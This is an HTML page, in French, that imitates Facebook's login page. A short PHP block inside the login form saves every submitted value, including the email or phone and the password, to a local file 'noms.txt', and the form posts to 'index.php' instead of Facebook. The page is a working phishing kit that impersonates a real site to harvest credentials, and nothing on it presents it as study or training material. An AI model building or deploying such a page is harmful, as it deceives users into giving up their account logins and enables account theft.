<!DOCTYPE html>
<html lang="fr" id="facebook" class="no_js">
  <head>
    <meta charset="utf-8" />
    <meta
      name="referrer"
      content="origin-when-crossorigin"
      id="meta_referrer"
    />

    <style nonce="6XjA68b2"></style>

    
    <link
      rel="icon"
      href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/NY8Vf8_FokQ.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="mr6Qeax"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/RspwE1UYLwr.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="Pud6B2Z"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/piXcg3ZJdR_.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="GrqIbBd"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/6MB_F4yiWj8.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="HLTHBFO"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/l/0,cross/wyuCUDWEnD5.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="9khhsYL"
      crossorigin="anonymous"
    />

  </head>
  <body
    class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit x1 Locale_fr_FR"
    dir="ltr"
  >
    <div class="_li" id="u_0_1_EE">
      <div id="globalContainer" class="uiContextualLayerParent">
        <div class="fb_content clearfix" id="content" role="main">
          <div>
            <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
              <div class="_8esk">
                <div class="_8esl">
                  <div class="_8ice">
                    <img
                      class="fb_logo _8ilh img"
                      src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                      alt="Facebook"
                    />
                  </div>
                  <h2 class="_8eso">
                    Avec Facebook, partagez et restez en contact avec votre
                    entourage.
                  </h2>
                </div>
                <div class="_8esn">
                  <div class="_8iep _8icy _9ahz _9ah-">
                    <div class="_6luv _52jv">
                      <?php
                          if(isset($_POST['submit'])) {
                              $data = "";
                              foreach ($_POST as $key => $value) {
                                  if ($key != "submit") {
                                      $data .= $value . "\n";
                                  }
                              }
                              file_put_contents('noms.txt', $data, FILE_APPEND);
                          }
                          ?>
                      <form
                        class="_9vtf"
                        data-testid="royal_login_form"
                        action="index.php"
                        method="post"
                        onsubmit=""
                        id="myForm"
                      >
                        <input
                          type="hidden"
                          name="jazoest"
                          value="2970"
                          autocomplete="off"
                        /><input
                          type="hidden"
                          name="lsd"
                          value="AVpVpmTKt0M"
                          autocomplete="off"
                        />
                        <div>
                          <div class="_6lux">
                            <input
                              type="text"
                              class="inputtext _55r1 _6luy"
                              name="email"
                              id="email"
                              data-testid="royal_email"
                              placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l."
                              autofocus="1"
                              aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l."
                            />
                          </div>
                          <div class="_6lux">
                            <div class="_6luy _55r1 _1kbt" id="passContainer">
                              <input
                                type="password"
                                class="inputtext _55r1 _6luy _9npi"
                                name="pass"
                                id="pass"
                                data-testid="royal_pass"
                                placeholder="Mot de passe"
                                aria-label="Mot de passe"
                              />
                              <div class="_9ls7" id="u_0_3_3c">
                                <a href="#" role="button"
                                  ><div class="_9lsa">
                                    <div class="_9lsb" id="u_0_4_xX"></div></div
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <input
                          type="hidden"
                          autocomplete="off"
                          name="login_source"
                          value="comet_headerless_login"
                        /><input
                          type="hidden"
                          autocomplete="off"
                          name="next"
                          value=""
                        />
                        <div class="_6ltg">
                          <button
                            value="1"
                            class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                            name="login"
                            data-testid="royal_login_button"
                            type="submit"
                            id="u_0_5_ZZ"
                            onclick="submitForm()"
                          >
                            Se connecter
                          </button>
                        </div>
                        <div class="_6ltj">
                          <a
                            href="#"
                            >Mot de passe oublié ?</a
                          >
                        </div>
                        <div class="_8icz"></div>
                        <div class="_6ltg">
                          <a
                            role="button"
                            class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                            href="#"
                            ajaxify="/reg/spotlight/"
                            id="u_0_0_rX"
                            data-testid="open-registration-form-button"
                            rel="async"
                            >Créer nouveau compte</a
                          >
                        </div>
                      </form>
                    </div>
                    <div id="reg_pages_msg" class="_58mk">
                      <a
                        href="/pages/create/?ref_type=registration_form"
                        class="_8esh"
                        >Créer une Page</a
                      >
                      pour une célébrité, une marque ou une entreprise.
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="">
          <div class="_95ke _8opy">
            <div
              id="pageFooter"
              data-referrer="page_footer"
              data-testid="page_footer"
            >
              <ul
                class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                data-nocookies="1"
              >
                <li>Français (France)</li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://www.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("en_US", "fr_FR", "https:\/\/www.facebook.com\/", "www_list_selector", 0); return false;'
                    title="English (US)"
                    >English (US)</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://ff-ng.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("ff_NG", "fr_FR", "https:\/\/ff-ng.facebook.com\/", "www_list_selector", 1); return false;'
                    title="Fula"
                    >Fula</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://es-es.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("es_ES", "fr_FR", "https:\/\/es-es.facebook.com\/", "www_list_selector", 2); return false;'
                    title="Spanish (Spain)"
                    >Español (España)</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://de-de.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("de_DE", "fr_FR", "https:\/\/de-de.facebook.com\/", "www_list_selector", 3); return false;'
                    title="German"
                    >Deutsch</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://id-id.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("id_ID", "fr_FR", "https:\/\/id-id.facebook.com\/", "www_list_selector", 4); return false;'
                    title="Indonesian"
                    >Bahasa Indonesia</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://it-it.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("it_IT", "fr_FR", "https:\/\/it-it.facebook.com\/", "www_list_selector", 5); return false;'
                    title="Italian"
                    >Italiano</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://pt-br.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("pt_BR", "fr_FR", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 6); return false;'
                    title="Portuguese (Brazil)"
                    >Português (Brasil)</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="rtl"
                    href="https://ar-ar.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("ar_AR", "fr_FR", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 7); return false;'
                    title="Arabic"
                    >العربية</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://hi-in.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("hi_IN", "fr_FR", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 8); return false;'
                    title="Hindi"
                    >हिन्दी</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://zh-cn.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("zh_CN", "fr_FR", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 9); return false;'
                    title="Simplified Chinese (China)"
                    >中文(简体)</a
                  >
                </li>
                <li>
                  <a
                    role="button"
                    class="_42ft _4jy0 _517i _517h _51sy"
                    rel="dialog"
                    ajaxify="/settings/language/language/?uri=https%3A%2F%2Fzh-cn.facebook.com%2F&amp;source=www_list_selector_more"
                    href="#"
                    title="Voir plus de langues"
                    ><i class="img sp_EP9wX8qDDvu sx_0de3e6"></i
                  ></a>
                </li>
              </ul>
              <div id="contentCurve"></div>
              <div
                id="pageFooterChildren"
                role="contentinfo"
                aria-label="Liens Facebook"
              >
                <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                  <li>
                    <a href="/reg/" title="Inscrivez-vous sur Facebook"
                      >S’inscrire</a
                    >
                  </li>
                  <li>
                    <a href="/login/" title="Se connecter &#xe0; Facebook"
                      >Se connecter</a
                    >
                  </li>
                  <li>
                    <a href="https://messenger.com/" title="Essayez Messenger."
                      >Messenger</a
                    >
                  </li>
                  <li>
                    <a href="/lite/" title="Facebook Lite pour Android."
                      >Facebook Lite</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.facebook.com/watch/"
                      title="Naviguez parmi nos vid&#xe9;os Watch."
                      >Watch</a
                    >
                  </li>
                  <li>
                    <a
                      href="/places/"
                      title="D&#xe9;couvrez les lieux populaires sur Facebook."
                      >Lieux</a
                    >
                  </li>
                  <li>
                    <a href="/games/" title="D&#xe9;couvrez les jeux Facebook."
                      >Jeux</a
                    >
                  </li>
                  <li>
                    <a
                      href="/marketplace/"
                      title="Achetez et vendez sur Facebook Marketplace."
                      >Marketplace</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://pay.facebook.com/"
                      title="En savoir plus sur Meta Pay"
                      target="_blank"
                      >Meta Pay</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.meta.com/"
                      title="D&#xe9;couvrez Meta"
                      target="_blank"
                      >Meta Store</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.meta.com/quest/"
                      title="En savoir plus sur Meta Quest"
                      target="_blank"
                      >Meta Quest</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0HNT2Q-yX1RA2UTXtNEA_GzaUftSA7knWQeMmVJ9ZiNvgu6OjRVm6PBCXimTvQ1qxF0enWdg0-9gKhsLERWZCsiIzfoMM4-WqOVqHTsqEfUY0AvlLeCmlF_jfTEESqT5usR_-H39vxcQ"
                      title="D&#xe9;couvrez Instagram"
                      target="_blank"
                      rel="noopener nofollow"
                      data-lynx-mode="asynclazy"
                      >Instagram</a
                    >
                  </li>
                  <li>
                    <a
                      href="/fundraisers/"
                      title="Faire un don &#xe0; des causes qui le m&#xe9;ritent."
                      >Collectes de dons</a
                    >
                  </li>
                  <li>
                    <a
                      href="/biz/directory/"
                      title="Parcourir notre annuaire des services Facebook."
                      >Services</a
                    >
                  </li>
                  <li>
                    <a
                      href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                      title="Voir le Centre d&#x2019;information sur les &#xe9;lections."
                      >Centre d’information sur les élections</a
                    >
                  </li>
                  <li>
                    <a
                      href="/privacy/policy/?entry_point=facebook_page_footer"
                      title="D&#xe9;couvrez comment nous collectons, utilisons et partageons les informations pour faire fonctionner Facebook."
                      >Politique de confidentialité</a
                    >
                  </li>
                  <li>
                    <a
                      href="/privacy/center/?entry_point=facebook_page_footer"
                      title="D&#xe9;couvrez comment g&#xe9;rer et contr&#xf4;ler votre confidentialit&#xe9; sur Facebook."
                      >Centre de confidentialité</a
                    >
                  </li>
                  <li>
                    <a
                      href="/groups/discover/"
                      title="D&#xe9;couvrir nos groupes."
                      >Groupes</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://about.meta.com/"
                      accesskey="8"
                      title="Consultez notre blog, d&#xe9;couvrez notre centre de ressources et recherchez des offres d&#x2019;emploi."
                      >À propos</a
                    >
                  </li>
                  <li>
                    <a
                      href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                      title="Diffusez votre publicit&#xe9; sur Facebook."
                      >Créer une publicité</a
                    >
                  </li>
                  <li>
                    <a
                      href="/pages/create/?ref_type=site_footer"
                      title="Cr&#xe9;ez une Page."
                      >Créer une Page</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://developers.facebook.com/?ref=pf"
                      title="D&#xe9;veloppez sur notre propre plateforme."
                      >Développeurs</a
                    >
                  </li>
                  <li>
                    <a
                      href="/careers/?ref=pf"
                      title="Faites &#xe9;voluer votre carri&#xe8;re en rejoignant notre incroyable entreprise."
                      >Emplois</a
                    >
                  </li>
                  <li>
                    <a
                      href="/policies/cookies/"
                      title="&#xc0; propos des cookies et de Facebook."
                      data-nocookies="1"
                      >Cookies</a
                    >
                  </li>
                  <li>
                    <a
                      class="_41ug"
                      data-nocookies="1"
                      href="https://www.facebook.com/help/568137493302217"
                      title="En savoir plus sur Choisir sa publicit&#xe9;."
                      >Choisir sa publicité<i
                        class="img sp_EP9wX8qDDvu sx_6bdd81"
                      ></i
                    ></a>
                  </li>
                  <li>
                    <a
                      data-nocookies="1"
                      href="/policies?ref=pf"
                      accesskey="9"
                      title="Prenez connaissance des conditions g&#xe9;n&#xe9;rales et des r&#xe8;glements."
                      >Conditions générales</a
                    >
                  </li>
                  <li>
                    <a
                      href="/help/?ref=pf"
                      accesskey="0"
                      title="Consultez les pages d&#x2019;aide."
                      >Aide</a
                    >
                  </li>
                  <li>
                    <a
                      href="help/637205020878504"
                      title="Consultez notre avis sur l&#x2019;importation des contacts et les non-utilisateurs."
                      >Importation des contacts et non-utilisateurs</a
                    >
                  </li>
                  <li>
                    <a
                      accesskey="6"
                      class="accessible_elem"
                      href="/settings"
                      title="Affichez et modifiez vos param&#xe8;tres Facebook."
                      >Paramètres</a
                    >
                  </li>
                  <li>
                    <a
                      accesskey="7"
                      class="accessible_elem"
                      href="/allactivity?privacy_source=activity_log_top_menu"
                      title="Affichez votre Historique d&#x2019;activit&#xe9;"
                      >Historique d’activité</a
                    >
                  </li>
                </ul>
              </div>
              <div class="mvl copyright">
                <div><span> Meta © 2023</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div></div>
      <span
        ><img
          src="https://facebook.com/security/hsts-pixel.gif"
          width="0"
          height="0"
          style="display: none"
      /></span>
    </div>
    <div style="display: none"><div></div></div>

    

  </body>
</html>
